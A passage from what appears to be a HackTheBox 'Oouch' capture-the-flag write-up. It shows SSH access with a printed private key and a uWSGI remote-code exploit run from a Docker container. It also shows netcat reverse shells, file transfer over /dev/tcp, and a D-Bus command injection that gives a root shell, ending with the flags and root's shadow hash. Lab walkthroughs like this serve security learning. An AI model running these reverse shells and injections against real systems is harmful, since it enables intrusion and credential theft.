/Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB/rDms7KYYFL
/4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA
AMBS+Fx1SFnQvV/c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb/TzVn/Eityt
cEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j
sz47/4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt
XkgLd4XMed+UCmjpC92/Ubjc+g/qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il
jKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9
dPU3FW6pLMOceN1tkWj+/8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w
EQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0/6Qxl
tV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM
2lVKmE7TTJTRYYhjA0vrE/kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co
G/0EInDfKoStwI9KV7/RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN
zYClNLoH22l81l3minmQ2+Gy7gWMEgTx/wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk
IEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA==
-----END OPENSSH PRIVATE KEY-----

```

### SSH Access with qtc

```
$ chmod 600 id_rsa
$ ssh -i id_rsa qtc@oouch.htb
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
qtc@oouch:~$ cat user.txt 
2dea47702ee688171c4918703f46cb3c
```

### Privilege Escalation : docker credential stuffing

Let's see if there is a hint:

```
qtc@oouch:~$ ls -lA
total 28
lrwxrwxrwx 1 root root    9 Feb 11 18:34 .bash_history -> /dev/null
-rw-r--r-- 1 qtc  qtc   220 Feb 11 18:11 .bash_logout
-rw-r--r-- 1 qtc  qtc  3526 Feb 11 18:11 .bashrc
drwx------ 3 qtc  qtc  4096 Feb 25 12:45 .gnupg
-rw-r--r-- 1 root root   55 Feb 11 18:34 .note.txt
-rw-r--r-- 1 qtc  qtc   807 Feb 11 18:11 .profile
drwx------ 2 qtc  qtc  4096 Feb 11 18:34 .ssh
-rw------- 1 qtc  qtc    33 Jun 30 10:00 user.txt
qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?
```

Let's see about dbus process:

```
$ ps -ef f | grep dbus
root      2688     1  0 09:59 ?        Ss     0:00 /root/dbus-server
message+  2690     1  0 09:59 ?        Ss     0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
```

Let's check a dbus trick on [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus):

`/etc/dbus-1/system.d/htb.oouch.Block.conf`

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

`www-data` can receive and send message from dbus.

Let's find something else.

As docker is running let's see the address ranges:

```
$ qtc@oouch:~$ ip addr show docker0 
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a1:27:4b:76 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

By looking at running process we should be able to find machines in `172.17.0.1/16` range.

The Django and Flask app are running on docker containers:

```
$ ps -ef f
...
root      3110     1  0 09:59 ?        Ssl    0:28 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      3567  3110  0 10:00 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.3 -container-port 5000
root      3618  3110  0 10:00 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.4 -container-port 8000
...
```

It seems we can connect on the customer Flask app host:

```
qtc@oouch:~$ ssh -i id_rsa qtc@172.18.0.3
Warning: Identity file id_rsa not accessible: No such file or directory.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 30 20:04:54 2020 from 172.18.0.1
qtc@aeb4525789d8:~$
```

There is a `/code` folder:

```
qtc@aeb4525789d8:/code$ ls -lh
total 44K
-rw-r--r-- 1 root root 1.1K Feb 11 17:34 Dockerfile
-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
-r-------- 1 root root 2.6K Feb 11 17:34 key
drwxr-xr-x 4 root root 4.0K Feb 11 17:34 migrations
-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4.0K Feb 11 17:34 oouch
-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
-rw-rw-rw- 1 root root    0 Jun 30 20:07 urls.txt
-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
```

`start.sh`:

```bash
#!/bin/bash
service ssh start
service nginx start
uwsgi --ini uwsgi.ini --chmod-sock=666
```

`uwsgi.ini`

```ini
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

`www-data` owns uwsgi.

### UWSGI exploitation

Let's check that uwsgi runs as www-data and is in a vulnerable version.

```
qtc@aeb4525789d8:~$ ps -ef | grep uwsgi
www-data    31     1  0 08:00 ?        00:00:05 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    32    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    33    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    34    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    35    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    36    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    37    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    38    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    39    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    40    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    41    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
qtc        140    90  0 22:06 pts/0    00:00:00 grep uwsgi
qtc@aeb4525789d8:~$ uwsgi --version
2.0.17.1
```

I found an RCE exploit on github: https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py

We need a quick patch, on line 18-19 in `sz()`, remove or comment the if statements.

```diff
def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
-   if sys.version_info[0] == 3: import bytes
+   #if sys.version_info[0] == 3: import bytes
-   s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
+   s = bytes.fromhex(s) #if sys.version_info[0] == 3 else s.decode('hex')
    return s[::-1]
```

Start a web server from you attacker machine.

On oouch machine retrieve the uwsgi exploit.

```
$ cd /tmp
$ wget http://10.10.15.142:8000/uwsgi_exp.py
```

Now we need to transfer then into the docker container but there aren't many binaries inside. So we will have to use a [GTFOBins tricks](https://gtfobins.github.io/gtfobins/bash/#file-download) with bash to download the file inside the container.

First start TCP socket on oouch machine.

```
$ nc -l -p 12345 < /tmp/uwsgi_exp.py
$ nc -l -p 12345 < /usr/bin/nc
```

And download it from the container:

```
$ export RHOST=172.17.0.1
$ export RPORT=12345
$ export LFILE=uwsgi_exp.py
$ bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
$ export LFILE=nc
$ bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
$ chmod +x nc
```

Note: since there is ssh, it was possible to transfer via `scp` too.

Let's exploit now!

On oouch:

```
nc -nlvp 12345
```

In the container:

```
$ python3 uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c "/home/qtc/nc -e /bin/bash 172.17.0.1 12345"
```

Now we obtained a `www-data` shell.

```
$ nc -nlvp 12345
listening on [any] 12345 ...
connect to [172.17.0.1] from (UNKNOWN) [172.18.0.3] 47676
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### DBUS Exploitation

- `www-data` can receive and send message from dbus.
- `www-data` owns uwsgi.

It's always better with a PTY.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

We start a listener on oouch machine:

```
$ nc -nlvp 9999
```

Now we can use `dbus-send` to gain a root shell:

```
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "string:;rm /tmp/.cyfun; mkfifo /tmp/.cyfun; cat /tmp/.cyfun | /bin/bash -i 2>&1 | nc 172.17.0.1 9999 >/tmp/.cyfun;"
```

And we receive the root shell:

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [172.17.0.1] from (UNKNOWN) [10.10.10.177] 37180
bash: cannot set terminal process group (2688): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# id
uid=0(root) gid=0(root) groups=0(root)
root@oouch:/root# cat root.txt
cat root.txt
ff9e6428ad626cb968daba6eb1d33540
```

### Bonus

To unlock some WU we will need the root hash:

```
# cat /etc/shadow | grep root
root:$6$UQS7GJnfVbWRz5KO$vEaGmrfKvdrqh50eCr7D3AAruNfPe1dYhiv..ykDhlWWYvgaoabrqujg51k60bQz3jgTx.yXh5jCHNZ6ArkQ.1:18303:0:99999:7:::
```

[nmap]:https://nmap.org/
[ffuf]:https://github.com/ffuf/ffuf
[burp]:https://portswigger.net/burp
